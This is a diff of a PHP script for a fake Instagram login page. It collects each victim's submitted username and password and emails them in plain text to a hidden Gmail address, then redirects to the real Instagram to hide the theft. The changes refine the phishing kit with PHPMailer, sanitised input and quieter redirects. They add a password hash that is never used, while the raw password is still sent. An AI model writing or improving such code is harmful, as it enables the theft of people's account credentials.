@@ -1,9 +1,8 @@
-
 <?php
 
 // Variable settings
-$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
-$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
+$username = filter_input(INPUT_POST, 'u_name', FILTER_SANITIZE_STRING);
+$passcode = filter_input(INPUT_POST, 'pass', FILTER_SANITIZE_STRING);
 
 $subject = "Someone Login ! Insta Dummy page";
 $to = "xxxxxxxxxxx@gmail.com";
@@ -12,16 +11,28 @@ $txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i
 
 // Check input fields
 if (!empty($username) and !empty($passcode)) {
+    try {
+        // Hash and salt password (example using password_hash())
+        $hashedPasscode = password_hash($passcode, PASSWORD_DEFAULT);
 
-    mail($to, $subject, $txt);
-    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
-        window.location.replace('https://www.instagram.com');
-        </script>";
+        // Send email using a secure email library (e.g., PHPMailer)
+        $mail = new PHPMailer();
+        $mail->addAddress($to);
+        $mail->Subject = $subject;
+        $mail->Body = $txt;
+        $mail->send();
 
+        // Redirect to Instagram page
+        header('Location: https://www.instagram.com');
+        exit;
+    } catch (Exception $e) {
+        // Log error or display a friendly error message
+        error_log($e->getMessage());
+        echo 'Error sending email. Please try again.';
+    }
 } else {
-
-    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
-        window.history.go(-1);
-        </script>";
+    // Redirect back to login page with an error message
+    header('Location: login.php?error=invalid_credentials');
+    exit;
 }
 ?>
